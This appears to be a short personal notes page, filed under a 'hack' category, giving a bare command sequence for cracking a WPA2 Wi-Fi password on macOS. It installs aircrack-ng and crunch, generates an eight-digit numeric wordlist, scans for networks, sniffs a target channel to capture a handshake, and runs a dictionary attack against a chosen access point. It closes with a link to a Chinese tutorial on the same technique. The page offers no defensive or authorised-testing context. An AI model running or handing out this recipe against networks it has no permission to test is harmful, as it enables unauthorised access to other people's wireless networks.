---
title: aircrack-ng
toc: true
date: 2021-09-24 19:29:18
tags:
categories:黑

---

```bash
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport

brew install aircrack-ng

brew install crunch			# optional

crunch 8 8 0123456789 -o dic.txt			#生成字典

sudo airport -s

sudo airport 网卡名 sniff 目标信道		#一般情况下，网卡名=en0

aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b **:**:**:**:**:** /tmp/airportSniff******.cap
```



## 参考资料

> - [**Mac上使用aircrack-ng破解Wi-Fi密码**](https://uare.github.io/2016/cracking-wifi-by-aircrack-ng-on-mac)


